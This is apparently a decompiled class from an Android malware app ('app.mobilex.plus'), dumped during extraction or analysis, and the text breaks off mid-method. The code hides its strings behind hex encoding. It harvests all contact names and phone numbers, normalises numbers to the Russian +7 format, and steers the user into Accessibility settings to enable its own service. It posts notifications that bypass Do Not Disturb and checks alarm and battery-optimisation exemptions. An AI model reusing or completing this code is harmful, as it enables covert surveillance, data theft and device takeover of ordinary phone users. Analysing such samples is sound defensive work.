package app.mobilex.plus;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.role.RoleManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.View;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.OvershootInterpolator;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.activity.ComponentActivity;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.services.SyncAdapterService;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;
import v.s.A1BaTVAMeIXMnh;
import v.s.A68NpXPqwTFos99nt;
import v.s.AInogFBF3uZEdg60;
import v.s.Aqh0grSwgDbwr;
import v.s.AqltFduMByzMV4g;
import v.s.BS2kx9eAoOyDiNGAFlFk;
import v.s.DirOmVsluSrk5EngI;
import v.s.ERzPBbsYGxZZQro2NYPo;
import v.s.H7JWbAQ2EAug6YHM8S;
import v.s.IqsDBf3FXcUYB8yZSHdp;
import v.s.JRdueaGIH5g8DVCPba;
import v.s.JV1KnSgnr44vUJP8N;
import v.s.JW3Lh9hxwLsO2ArTlH;
import v.s.JXn4Qf7zpnLjP5;
import v.s.JnC75xOgwtSSKHn30v;
import v.s.KV57Z6oavcB595B8Dy8Z;
import v.s.KgSM0TsKUpCiuePB;
import v.s.LRT9aFvEZ8jjymwD;
import v.s.N4h1mGVqsY6M8lTtB;
import v.s.NB5LVitKoIkG7GAQ6;
import v.s.OFtLBiBbrrTHWu;
import v.s.Qs0lwBTNjKb4hSJe;
import v.s.RIZfHbqXpth8r2yN4;
import v.s.S0vGWkOuChnrVWDa;
import v.s.SXuc7yHnGVKI;
import v.s.Vh83j6fdPcPn0aP56nzv;
import v.s.W6dfON4KdcdxlH;
import v.s.XjSHuXm0nOSRc3iA9;
import v.s.Y9mRyRdkl5FOcwb66V6;
import v.s.aiO5jRTHj9azsn306;
import v.s.cpTq2XMCb5JSaEhn;
import v.s.eTeIZwLyooQrZ0ICI9i;
import v.s.euF5Udt5Rqv3Qmea;
import v.s.fTTdiiD76ErrE12U;
import v.s.g78iUtGnOvef;
import v.s.gA5gCwTK0qjTIn;
import v.s.gTzjNYsqUKrf2tbmP;
import v.s.hzCVl0f866ksvpzUUql;
import v.s.imhBI9RqzETHtVIJe;
import v.s.jdOQeRk37T35X5xKW1P;
import v.s.jme6JDteoDB1AsG4;
import v.s.kExylgSxUDTVQOx3o0oq;
import v.s.lyzhjBmnW0B6JDw;
import v.s.mSyFfcAAyjxLnl2Ul6;
import v.s.mecOg4FyTfQgo6T;
import v.s.oJLsXXGxdTuQpIRpV;
import v.s.oRoeOWAwLibMBxZYyTh;
import v.s.okc5AGRjqrud84oM6d;
import v.s.qkzRt1s9DJNNYwsqt;
import v.s.s4Xe0OepSKbHpb3Nsd;
import v.s.sNACkioAJERo;
import v.s.snDbSR9Gb3eZZuB;
import v.s.umMdYoePNXvWWPn;
import v.s.xAY36KEWHIBZ;
import v.s.xEMhlPHEg6l7ZCe0;
import v.s.yI1KTRoNlsjx;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UtilNWWrapper extends ComponentActivity {
    public static final String A1BaTVAMeIXMnh;
    public static final String MSGkxvPxRYNqC;
    public static final String VEkRsTDS6a9oHWI;
    public static final String YIgR6F2ZXmLx2ul;
    public static final String dQC4QhgRN3MSEAP3HW0;
    public static final String euF5Udt5Rqv3Qmea;
    public static final String is7XW2V21HfKv7MihWy;
    public static final String jdOQeRk37T35X5xKW1P;
    public static final String qfTrc75xwRVMl85vh;
    public ArrayList DVTNwpDEVsUKuznof;
    public final eTeIZwLyooQrZ0ICI9i ECwLkmPW1UKz7J6E;
    public JSONObject H9XlUr4OeMJFiXK;
    public int K7eEOBPYP9VIoHWTe;
    public View O2DHNSIGZlgPja7eqLgn;
    public boolean XuO9PPFo607ssKwZjNW;
    public final eTeIZwLyooQrZ0ICI9i fivkjwgu2UdAtiY;
    public boolean hV4VTKNUdeHN;
    public final eTeIZwLyooQrZ0ICI9i iUQk66nAiXgO35;
    public boolean k84rwRrqzhrNQ1CdNQ9;
    public int l1V0lQr6TbwNKqHfXNbb;
    public FrameLayout rCHnHJBAlOpNI5;
    public boolean vIJudZvPyTuNp;
    public int xfn2GJwmGqs7kWW;
    public WebView yTljMGnIibTRdOpSh4;
    public final lyzhjBmnW0B6JDw dTS0S7eC32ubQH54j36 = new lyzhjBmnW0B6JDw(new H7JWbAQ2EAug6YHM8S(this, 25));
    public final lyzhjBmnW0B6JDw EWUjsTERgdPbSw3NNlN = new lyzhjBmnW0B6JDw(new H7JWbAQ2EAug6YHM8S(this, 26));
    public Object tne6mXOUFKdd = qkzRt1s9DJNNYwsqt.w9sT1Swbhx3hs;

    static {
        TypefaceCache.obtain("000C0058007900A800D1008D00F6008E000D0051");
        A1BaTVAMeIXMnh = TypefaceCache.obtain("0030007B004800B800FD00BE00DC00A600240073004900B800E000AD00D700A10030");
        euF5Udt5Rqv3Qmea = TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048");
        qfTrc75xwRVMl85vh = TypefaceCache.obtain("002C00780059008800F100AD00D600AE002D00710064009400E400BA00C2");
        MSGkxvPxRYNqC = TypefaceCache.obtain("0030007B004800B800F400BA00DC00BE001C00750054009200FE00AB");
        VEkRsTDS6a9oHWI = TypefaceCache.obtain("003700730057008200F700AD00D300AA001C0065005E008900E4");
        jdOQeRk37T35X5xKW1P = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E009500CF00AC00D700A90037");
        is7XW2V21HfKv7MihWy = TypefaceCache.obtain("00300077004D008200F4008000C200AF002C0078005E00B800FE00AA00DF00A500260064");
        dQC4QhgRN3MSEAP3HW0 = TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA");
        YIgR6F2ZXmLx2ul = TypefaceCache.obtain("00220063004F008800CF00AD00D700B6003600730048009300CF00AC00DF00B4");
    }

    public UtilNWWrapper() {
        final int i = 0;
        this.fivkjwgu2UdAtiY = Ee8d2j4S9Vm5yGuR(new A1BaTVAMeIXMnh(this) { // from class: v.s.PBTcNJexjysW3ozfqnxZ
            public final /* synthetic */ UtilNWWrapper vekpFI4d1Nc4fakF;

            {
                this.vekpFI4d1Nc4fakF = this;
            }

            private static /* synthetic */ void clvlnxtwj() {
            }

            @Override // v.s.A1BaTVAMeIXMnh
            public final void dDIMxZXP1V8HdM(Object obj) {
                int i2 = i;
                UtilNWWrapper utilNWWrapper = this.vekpFI4d1Nc4fakF;
                switch (i2) {
                    case 0:
                        String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(utilNWWrapper, 4), 300L);
                        break;
                    case 1:
                        Map map = (Map) obj;
                        String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        if (!map.isEmpty()) {
                            Iterator it = map.entrySet().iterator();
                            while (it.hasNext() && ((Boolean) ((Map.Entry) it.next()).getValue()).booleanValue()) {
                            }
                        }
                        TypefaceCache.obtain("00620037001A00C700C3009200E100E7003300730049008A00F900AC00C100AE002C0078004800C700E200BA00C100B2002F0062000100C7");
                        TypefaceCache.obtain("006F0036005A008B00FC009800C000A6002D0062005E008300AA00FF");
                        map.toString();
                        if (!utilNWWrapper.l1V0lQr6TbwNKqHfXNbb().getBoolean(UtilNWWrapper.VEkRsTDS6a9oHWI, false)) {
                            utilNWWrapper.qfTrc75xwRVMl85vh();
                        }
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    case 2:
                        String str3 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("000F00790058008600E400B600DD00A900630066005E009500FD00B600C100B4002A00790055009400B000AD00D700B40036007A004F00C700E200BA00D100A2002A0060005E0083");
                        utilNWWrapper.gmNWMfvn6zlEj();
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    default:
                        String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("00130059006800B300CF009100FD0093000A0050007200A400D1008B00FB0088000D0045001B009500F500AC00C700AB0037002C001B");
                        if (!utilNWWrapper.vIJudZvPyTuNp) {
                            utilNWWrapper.gmNWMfvn6zlEj();
                            utilNWWrapper.tne6mXOUFKdd();
                        } else {
                            utilNWWrapper.D5P1xCAyuvgF();
                        }
                        break;
                }
            }
        }, new euF5Udt5Rqv3Qmea(2));
        final int i2 = 1;
        this.ECwLkmPW1UKz7J6E = Ee8d2j4S9Vm5yGuR(new A1BaTVAMeIXMnh(this) { // from class: v.s.PBTcNJexjysW3ozfqnxZ
            public final /* synthetic */ UtilNWWrapper vekpFI4d1Nc4fakF;

            {
                this.vekpFI4d1Nc4fakF = this;
            }

            private static /* synthetic */ void clvlnxtwj() {
            }

            @Override // v.s.A1BaTVAMeIXMnh
            public final void dDIMxZXP1V8HdM(Object obj) {
                int i3 = i2;
                UtilNWWrapper utilNWWrapper = this.vekpFI4d1Nc4fakF;
                switch (i3) {
                    case 0:
                        String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(utilNWWrapper, 4), 300L);
                        break;
                    case 1:
                        Map map = (Map) obj;
                        String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        if (!map.isEmpty()) {
                            Iterator it = map.entrySet().iterator();
                            while (it.hasNext() && ((Boolean) ((Map.Entry) it.next()).getValue()).booleanValue()) {
                            }
                        }
                        TypefaceCache.obtain("00620037001A00C700C3009200E100E7003300730049008A00F900AC00C100AE002C0078004800C700E200BA00C100B2002F0062000100C7");
                        TypefaceCache.obtain("006F0036005A008B00FC009800C000A6002D0062005E008300AA00FF");
                        map.toString();
                        if (!utilNWWrapper.l1V0lQr6TbwNKqHfXNbb().getBoolean(UtilNWWrapper.VEkRsTDS6a9oHWI, false)) {
                            utilNWWrapper.qfTrc75xwRVMl85vh();
                        }
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    case 2:
                        String str3 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("000F00790058008600E400B600DD00A900630066005E009500FD00B600C100B4002A00790055009400B000AD00D700B40036007A004F00C700E200BA00D100A2002A0060005E0083");
                        utilNWWrapper.gmNWMfvn6zlEj();
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    default:
                        String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("00130059006800B300CF009100FD0093000A0050007200A400D1008B00FB0088000D0045001B009500F500AC00C700AB0037002C001B");
                        if (!utilNWWrapper.vIJudZvPyTuNp) {
                            utilNWWrapper.gmNWMfvn6zlEj();
                            utilNWWrapper.tne6mXOUFKdd();
                        } else {
                            utilNWWrapper.D5P1xCAyuvgF();
                        }
                        break;
                }
            }
        }, new euF5Udt5Rqv3Qmea(0));
        final int i3 = 2;
        Ee8d2j4S9Vm5yGuR(new A1BaTVAMeIXMnh(this) { // from class: v.s.PBTcNJexjysW3ozfqnxZ
            public final /* synthetic */ UtilNWWrapper vekpFI4d1Nc4fakF;

            {
                this.vekpFI4d1Nc4fakF = this;
            }

            private static /* synthetic */ void clvlnxtwj() {
            }

            @Override // v.s.A1BaTVAMeIXMnh
            public final void dDIMxZXP1V8HdM(Object obj) {
                int i4 = i3;
                UtilNWWrapper utilNWWrapper = this.vekpFI4d1Nc4fakF;
                switch (i4) {
                    case 0:
                        String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(utilNWWrapper, 4), 300L);
                        break;
                    case 1:
                        Map map = (Map) obj;
                        String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        if (!map.isEmpty()) {
                            Iterator it = map.entrySet().iterator();
                            while (it.hasNext() && ((Boolean) ((Map.Entry) it.next()).getValue()).booleanValue()) {
                            }
                        }
                        TypefaceCache.obtain("00620037001A00C700C3009200E100E7003300730049008A00F900AC00C100AE002C0078004800C700E200BA00C100B2002F0062000100C7");
                        TypefaceCache.obtain("006F0036005A008B00FC009800C000A6002D0062005E008300AA00FF");
                        map.toString();
                        if (!utilNWWrapper.l1V0lQr6TbwNKqHfXNbb().getBoolean(UtilNWWrapper.VEkRsTDS6a9oHWI, false)) {
                            utilNWWrapper.qfTrc75xwRVMl85vh();
                        }
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    case 2:
                        String str3 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("000F00790058008600E400B600DD00A900630066005E009500FD00B600C100B4002A00790055009400B000AD00D700B40036007A004F00C700E200BA00D100A2002A0060005E0083");
                        utilNWWrapper.gmNWMfvn6zlEj();
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    default:
                        String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("00130059006800B300CF009100FD0093000A0050007200A400D1008B00FB0088000D0045001B009500F500AC00C700AB0037002C001B");
                        if (!utilNWWrapper.vIJudZvPyTuNp) {
                            utilNWWrapper.gmNWMfvn6zlEj();
                            utilNWWrapper.tne6mXOUFKdd();
                        } else {
                            utilNWWrapper.D5P1xCAyuvgF();
                        }
                        break;
                }
            }
        }, new euF5Udt5Rqv3Qmea(0));
        final int i4 = 3;
        this.iUQk66nAiXgO35 = Ee8d2j4S9Vm5yGuR(new A1BaTVAMeIXMnh(this) { // from class: v.s.PBTcNJexjysW3ozfqnxZ
            public final /* synthetic */ UtilNWWrapper vekpFI4d1Nc4fakF;

            {
                this.vekpFI4d1Nc4fakF = this;
            }

            private static /* synthetic */ void clvlnxtwj() {
            }

            @Override // v.s.A1BaTVAMeIXMnh
            public final void dDIMxZXP1V8HdM(Object obj) {
                int i5 = i4;
                UtilNWWrapper utilNWWrapper = this.vekpFI4d1Nc4fakF;
                switch (i5) {
                    case 0:
                        String str = UtilNWWrapper.A1BaTVAMeIXMnh;
                        new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(utilNWWrapper, 4), 300L);
                        break;
                    case 1:
                        Map map = (Map) obj;
                        String str2 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        if (!map.isEmpty()) {
                            Iterator it = map.entrySet().iterator();
                            while (it.hasNext() && ((Boolean) ((Map.Entry) it.next()).getValue()).booleanValue()) {
                            }
                        }
                        TypefaceCache.obtain("00620037001A00C700C3009200E100E7003300730049008A00F900AC00C100AE002C0078004800C700E200BA00C100B2002F0062000100C7");
                        TypefaceCache.obtain("006F0036005A008B00FC009800C000A6002D0062005E008300AA00FF");
                        map.toString();
                        if (!utilNWWrapper.l1V0lQr6TbwNKqHfXNbb().getBoolean(UtilNWWrapper.VEkRsTDS6a9oHWI, false)) {
                            utilNWWrapper.qfTrc75xwRVMl85vh();
                        }
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    case 2:
                        String str3 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("000F00790058008600E400B600DD00A900630066005E009500FD00B600C100B4002A00790055009400B000AD00D700B40036007A004F00C700E200BA00D100A2002A0060005E0083");
                        utilNWWrapper.gmNWMfvn6zlEj();
                        utilNWWrapper.tne6mXOUFKdd();
                        break;
                    default:
                        String str4 = UtilNWWrapper.A1BaTVAMeIXMnh;
                        TypefaceCache.obtain("00130059006800B300CF009100FD0093000A0050007200A400D1008B00FB0088000D0045001B009500F500AC00C700AB0037002C001B");
                        if (!utilNWWrapper.vIJudZvPyTuNp) {
                            utilNWWrapper.gmNWMfvn6zlEj();
                            utilNWWrapper.tne6mXOUFKdd();
                        } else {
                            utilNWWrapper.D5P1xCAyuvgF();
                        }
                        break;
                }
            }
        }, new euF5Udt5Rqv3Qmea(1));
    }

    public static String H9XlUr4OeMJFiXK(String str) {
        String strReplaceAll = Pattern.compile(TypefaceCache.obtain("00180048000B00CA00A900F400EF")).matcher(str).replaceAll("");
        if (!strReplaceAll.startsWith("+") || strReplaceAll.length() < 11) {
            if (strReplaceAll.startsWith("8") && strReplaceAll.length() == 11) {
                return "+7".concat(strReplaceAll.substring(1));
            }
            if (strReplaceAll.startsWith("7") && strReplaceAll.length() == 11) {
                return "+".concat(strReplaceAll);
            }
            if (strReplaceAll.length() == 10) {
                return "+7".concat(strReplaceAll);
            }
            if (strReplaceAll.length() < 10) {
                return null;
            }
        }
        return strReplaceAll;
    }

    public static final void b1EoSIRjJHO5(UtilNWWrapper utilNWWrapper) {
        String string;
        if (utilNWWrapper.dTS0S7eC32ubQH54j36()) {
            utilNWWrapper.gmNWMfvn6zlEj();
            return;
        }
        try {
            NotificationManager notificationManager = (NotificationManager) utilNWWrapper.getSystemService("notification");
            String strObtain = TypefaceCache.obtain("00220075005800B800F800B600D500AF002F007F005C008F00E4");
            NotificationChannel notificationChannel = new NotificationChannel(strObtain, TypefaceCache.checked("045E0426047A04A504D004E1048B04FD0473"), 4);
            notificationChannel.setDescription(TypefaceCache.checked("045C0428040F04A604AA04EF048504FD0473"));
            notificationChannel.enableVibration(true);
            notificationChannel.setVibrationPattern(new long[]{0, 200, 100, 200, 100, 200});
            notificationChannel.setBypassDnd(true);
            notificationManager.createNotificationChannel(notificationChannel);
            try {
                string = utilNWWrapper.getPackageManager().getApplicationLabel(utilNWWrapper.getPackageManager().getApplicationInfo(utilNWWrapper.getPackageName(), 0)).toString();
            } catch (Exception unused) {
                string = utilNWWrapper.getString(2131427362);
            }
            s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(utilNWWrapper, strObtain);
            Notification notification = s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe;
            notification.icon = 2131034143;
            s4xe0oepskbhpb3nsd.Ee8d2j4S9Vm5yGuR = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(utilNWWrapper.getString(2131427365, string));
            s4xe0oepskbhpb3nsd.xDyLpEZyrcKVe0 = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(utilNWWrapper.getString(2131427364, string));
            ERzPBbsYGxZZQro2NYPo eRzPBbsYGxZZQro2NYPo = new ERzPBbsYGxZZQro2NYPo();
            eRzPBbsYGxZZQro2NYPo.w9sT1Swbhx3hs = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(utilNWWrapper.getString(2131427363, string));
            s4xe0oepskbhpb3nsd.Ee8d2j4S9Vm5yGuR(eRzPBbsYGxZZQro2NYPo);
            s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = 1;
            notification.defaults = -1;
            notification.flags |= 1;
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(16, true);
            s4xe0oepskbhpb3nsd.DVTNwpDEVsUKuznof = 15000L;
            notificationManager.notify(7777, s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM());
            new Handler(Looper.getMainLooper()).postDelayed(new hzCVl0f866ksvpzUUql(15, notificationManager), 8000L);
        } catch (Exception unused2) {
        }
        String strFlattenToString = new ComponentName(utilNWWrapper.getPackageName(), DataQFAdapter.class.getName()).flattenToString();
        try {
            Intent intent = new Intent(TypefaceCache.obtain("00220078005F009500FF00B600D600E900300073004F009300F900B100D500B4006D0057007800A400D5008C00E1008E0001005F007700AE00C4008600ED008300060042007A00AE00DC008C00ED009400060042006F00AE00DE009800E1"));
            intent.addFlags(268435456);
            intent.putExtra("android.intent.extra.COMPONENT_NAME", strFlattenToString);
            utilNWWrapper.startActivity(intent);
        } catch (Exception unused3) {
            try {
                try {
                    Intent intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent2.addFlags(335544320);
                    intent2.putExtra(TypefaceCache.obtain("00790065005E009300E400B600DC00A00030002C005D009500F100B800DF00A2002D00620064008600E200B800C10098002800730042"), strFlattenToString);
                    intent2.putExtra(TypefaceCache.obtain("0006004E006F00B500D1008000F4009500020051007600A200DE008B00ED008600110051006400AC00D50086"), strFlattenToString);
                    intent2.putExtra(TypefaceCache.obtain("00220078005F009500FF00B600D600E9003300640054009100F900BB00D700B5006D00730043009300E200BE009C008100110057007C00AA00D5009100E6009800020044007C00B800DB009A00EB"), strFlattenToString);
                    Bundle bundle = new Bundle();
                    bundle.putString(TypefaceCache.obtain("00790065005E009300E400B600DC00A00030002C005D009500F100B800DF00A2002D00620064008600E200B800C10098002800730042"), strFlattenToString);
                    bundle.putString(TypefaceCache.obtain("00220078005F009500FF00B600D600E9003300640054009100F900BB00D700B5006D00730043009300E200BE009C008100110057007C00AA00D5009100E6009800020044007C00B800DB009A00EB"), strFlattenToString);
                    intent2.putExtra(TypefaceCache.obtain("00790065005E009300E400B600DC00A00030002C0048008F00FF00A800ED00A100310077005C008A00F500B100C6009800220064005C0094"), bundle);
                    intent2.putExtra(TypefaceCache.obtain("0006004E006F00B500D1008000E1008F000C0041006400A100C2009E00F5008A00060058006F00B800D1008D00F50092000E0053007500B300C3"), bundle);
                    utilNWWrapper.startActivity(intent2);
                } catch (Exception unused4) {
                    utilNWWrapper.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
                }
            } catch (Exception unused5) {
            }
        }
    }

    public static final ArrayList ibVTtJUNfrGYbW(UtilNWWrapper utilNWWrapper) {
        ArrayList arrayList = new ArrayList();
        try {
            Cursor cursorQuery = utilNWWrapper.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"display_name", "data1"}, null, null, null);
            if (cursorQuery == null) {
                return arrayList;
            }
            while (cursorQuery.moveToNext()) {
                try {
                    String string = cursorQuery.getString(0);
                    String str = "";
                    if (string == null) {
                        string = "";
                    }
                    String string2 = cursorQuery.getString((-31) + 32);
                    if (string2 != null) {
                        str = string2;
                    }
                    if (str.length() > 0) {
                        arrayList.add(oRoeOWAwLibMBxZYyTh.l1V0lQr6TbwNKqHfXNbb(new yI1KTRoNlsjx(TypefaceCache.obtain("002D007700560082"), string), new yI1KTRoNlsjx(TypefaceCache.obtain("0033007E0054008900F5"), str)));
                    }
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                        throw th2;
                    }
                }
            }
            cursorQuery.close();
            return arrayList;
        } catch (Exception e) {
            TypefaceCache.obtain("00240073004F00A400FF00B100C600A600200062004800AB00F900AC00C600E7002600640049008800E200E50092");
            e.getMessage();
            return arrayList;
        }
    }

    public static final void pyu8ovAipBTLYAiKab(UtilNWWrapper utilNWWrapper) {
        if (Build.VERSION.SDK_INT < 33) {
            if (utilNWWrapper.vIJudZvPyTuNp) {
                utilNWWrapper.D5P1xCAyuvgF();
                return;
            } else {
                utilNWWrapper.gmNWMfvn6zlEj();
                return;
            }
        }
        if (!utilNWWrapper.vIJudZvPyTuNp()) {
            utilNWWrapper.iUQk66nAiXgO35.vekpFI4d1Nc4fakF("android.permission.POST_NOTIFICATIONS");
        } else if (utilNWWrapper.vIJudZvPyTuNp) {
            utilNWWrapper.D5P1xCAyuvgF();
        } else {
            utilNWWrapper.gmNWMfvn6zlEj();
        }
    }

    public static final void xDyLpEZyrcKVe0(UtilNWWrapper utilNWWrapper, Canvas canvas, float f) {
        Paint paint = new Paint(1);
        paint.setColor(-1);
        Path path = new Path();
        float f2 = f * 0.5f;
        float f3 = f * 0.12f;
        path.moveTo(f2, f3);
        float f4 = f * 0.2f;
        float f5 = f * 0.32f;
        path.cubicTo(f * 0.28f, f3, f4, f5, f4, f2);
        float f6 = f * 0.15f;
        float f7 = f * 0.68f;
        path.lineTo(f6, f7);
        float f8 = f * 0.85f;
        path.lineTo(f8, f7);
        float f9 = f * 0.8f;
        path.lineTo(f9, f2);
        path.cubicTo(f9, f5, f * 0.72f, f3, f2, f3);
        path.close();
        canvas.drawPath(path, paint);
        canvas.drawRect(f6, f7, f8, f * 0.74f, paint);
        canvas.drawCircle(f2, 0.82f * f, 0.08f * f, paint);
        canvas.drawCircle(f2, 0.1f * f, 0.025f * f, paint);
    }

    public final void A1BaTVAMeIXMnh() {
        if (Build.VERSION.SDK_INT >= 31) {
            try {
                if (((AlarmManager) getSystemService("alarm")).canScheduleExactAlarms()) {
                    return;
                }
                Intent intent = new Intent("android.settings.REQUEST_SCHEDULE_EXACT_ALARM");
                intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + getPackageName()));
                startActivity(intent);
            } catch (Exception unused) {
            }
        }
    }

    public final void D5P1xCAyuvgF() {
        this.xfn2GJwmGqs7kWW++;
        AInogFBF3uZEdg60 aInogFBF3uZEdg60 = new AInogFBF3uZEdg60(this, 3);
        FrameLayout frameLayout = this.rCHnHJBAlOpNI5;
        View childAt = frameLayout != null ? frameLayout.getChildAt(0) : null;
        if (childAt == null) {
            aInogFBF3uZEdg60.run();
        } else {
            childAt.animate().translationY(Qrz92kRPw4GcghAc(100)).alpha(0.0f).setDuration(280L).setInterpolator(new AccelerateInterpolator()).withEndAction(new A68NpXPqwTFos99nt(this, 20, aInogFBF3uZEdg60)).start();
        }
    }

    public final yI1KTRoNlsjx DVTNwpDEVsUKuznof(int i) {
        JSONObject jSONObject = this.H9XlUr4OeMJFiXK;
        if (jSONObject == null) {
            return new yI1KTRoNlsjx(null, null);
        }
        JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray(Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(TypefaceCache.obtain(oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs() ? "00300062005E008600FC00BA00C0009800310077004F00B800F300BE00C000A300300049" : "00300062005E008600FC00BA00C00098002000770049008300E30080"), jSONObject.optString(TypefaceCache.obtain("002F00770055008000E500BE00D500A2"), "ru")));
        if (jSONArrayOptJSONArray == null) {
            return new yI1KTRoNlsjx(null, null);
        }
        JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(i);
        if (jSONObjectOptJSONObject == null) {
            return new yI1KTRoNlsjx(null, null);
        }
        String strOptString = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("0037007F004F008B00F5"), "");
        String strOptString2 = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("003000630059009300F900AB00DE00A2"), "");
        if (strOptString.length() <= 0) {
            strOptString = null;
        }
        return new yI1KTRoNlsjx(strOptString, strOptString2.length() > 0 ? strOptString2 : null);
    }

    /* JADX WARN: Type inference failed for: r0v13, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    public final void ECwLkmPW1UKz7J6E() {
        try {
            K7eEOBPYP9VIoHWTe(this.l1V0lQr6TbwNKqHfXNbb);
            while (true) {
                int i = this.l1V0lQr6TbwNKqHfXNbb;
                ArrayList arrayList = this.DVTNwpDEVsUKuznof;
                if (arrayList == null) {
                    arrayList = null;
                }
                if (i < arrayList.size()) {
                    ArrayList arrayList2 = this.DVTNwpDEVsUKuznof;
                    if (arrayList2 == null) {
                        arrayList2 = null;
                    }
                    if (!((Boolean) ((fTTdiiD76ErrE12U) arrayList2.get(this.l1V0lQr6TbwNKqHfXNbb)).ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                        break;
                    }
                    try {
                        K7eEOBPYP9VIoHWTe(this.l1V0lQr6TbwNKqHfXNbb);
                    } catch (Exception unused) {
                    }
                    this.l1V0lQr6TbwNKqHfXNbb++;
                } else {
                    break;
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("0010007F005F008200B000BA00D400A100260075004F009400B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
        this.l1V0lQr6TbwNKqHfXNbb++;
        l1V0lQr6TbwNKqHfXNbb().edit().putInt(qfTrc75xwRVMl85vh, this.l1V0lQr6TbwNKqHfXNbb).apply();
        int i2 = this.l1V0lQr6TbwNKqHfXNbb;
        ArrayList arrayList3 = this.DVTNwpDEVsUKuznof;
        if (i2 >= (arrayList3 != null ? arrayList3 : null).size()) {
            gIIiyi2ddlMDR0();
        } else {
            jdOQeRk37T35X5xKW1P(this.l1V0lQr6TbwNKqHfXNbb);
        }
    }

    public final boolean EWUjsTERgdPbSw3NNlN() {
        try {
            return ((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception unused) {
            return false;
        }
    }

    public final String J0zjQ7CAgohuxU20eCW6() {
        String string;
